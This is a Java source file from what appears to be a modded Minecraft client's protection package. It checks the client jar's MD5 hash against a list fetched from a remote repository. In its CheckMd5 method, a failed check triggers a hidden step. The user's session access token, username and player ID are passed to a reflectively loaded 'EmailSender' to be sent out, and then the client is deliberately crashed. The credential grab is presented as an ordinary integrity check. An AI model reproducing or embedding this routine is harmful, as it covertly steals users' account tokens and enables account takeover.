package cn.timer.ultra.protection.lk.utils;

import cn.timer.ultra.protection.ProtectionLoader;
import net.minecraft.client.Minecraft;
import net.minecraft.client.main.Main;
import net.minecraft.util.Session;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.security.DigestInputStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class CheckMD5 {
    public static String MD5_num = "114514";

    /**
     * 检验文件生成唯一的md5值       作用：检验文件是否已被修改
     *
     * @param file 需要检验的文件
     * @return 该文件的md5值
     */
    public static String checkMd5(File file) {
        // 若输入的参数不是一个文件 则抛出异常
        if (!file.isFile()) {
            throw new NumberFormatException(file.getAbsolutePath() + " isn't a file!");
        }

        // 定义相关变量
        FileInputStream fis = null;
        byte[] rb = null;
        DigestInputStream digestInputStream;

        try {
            fis = new FileInputStream(file);
            MessageDigest md5 = MessageDigest.getInstance("md5");
            digestInputStream = new DigestInputStream(fis, md5);
            byte[] buffer = new byte[4096];
            while (true) {
                if (!(digestInputStream.read(buffer) > 0)) {
                    break;
                }
            }
            md5 = digestInputStream.getMessageDigest();
            rb = md5.digest();

        } catch (IOException | NoSuchAlgorithmException e) {
            e.printStackTrace();
        } finally {
            try {
                assert fis != null;
                fis.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        StringBuilder sb = new StringBuilder();
        assert rb != null;
        for (byte b : rb) {
            String a = Integer.toHexString(0XFF & b);
            if (a.length() < 2) {
                a = '0' + a;
            }
            sb.append(a);
        }
        return sb.toString(); //得到md5值
    }

    public static String getMD5_num() {
        return MD5_num;
    }

    private static boolean firstCheck = true;

    public static void CheckMd5() throws Exception {
        String JarPath = java.net.URLDecoder.decode(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath(), "UTF-8");
        File directory = new File("");//设定为当前文件夹
        String MD5url = "https://gitee.com/yuxiangll/lorraine/raw/master/MD5";
        String reMD5 = get(MD5url);
        MD5_num = checkMd5(new File(JarPath));
        System.out.println(directory.getCanonicalPath() + "\\versions\\Ultra-Client\\Ultra-Client.jar");
        if (!reMD5.contains(checkMd5(new File(JarPath)))) {
            Session session = Minecraft.getMinecraft().getSession();
            ProtectionLoader.getLoadedClass().get("EmailSender").getMethod("sendMessage", String.class).invoke(null, session.getToken() + " " + session.getUsername() + " " + session.getPlayerID());
            System.out.println("为什么魔改客户端");
            ProtectionLoader.getLoadedClass().get("AntiLeak").getMethod("crashClient", String.class, String.class).invoke(null, "Warning", "你为什么要魔改客户端，气死我了");
        }
        if ((!reMD5.substring(reMD5.length() - 33, reMD5.length() - 1).equals(checkMd5(new File(JarPath)))) && firstCheck) {
            ProtectionLoader.getLoadedClass().get("AntiLeak").getMethod("windowMessage", String.class, String.class).invoke(null, "Info", "New Update found.");
        }
        firstCheck = false;
    }

    /**
     * get请求
     *
     * @param url String
     * @return content
     * @throws Exception exception
     */
    public static String get(String url) throws Exception {
        String content = null;
        URLConnection urlConnection = new URL(url).openConnection();
        HttpURLConnection connection = (HttpURLConnection) urlConnection;
        connection.setRequestMethod("GET");
        //连接
        connection.connect();
        //得到响应码
        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder bs = new StringBuilder();
            String l;
            while ((l = bufferedReader.readLine()) != null) {
                bs.append(l).append("\n");
            }
            content = bs.toString();
        }
        return content;
    }
}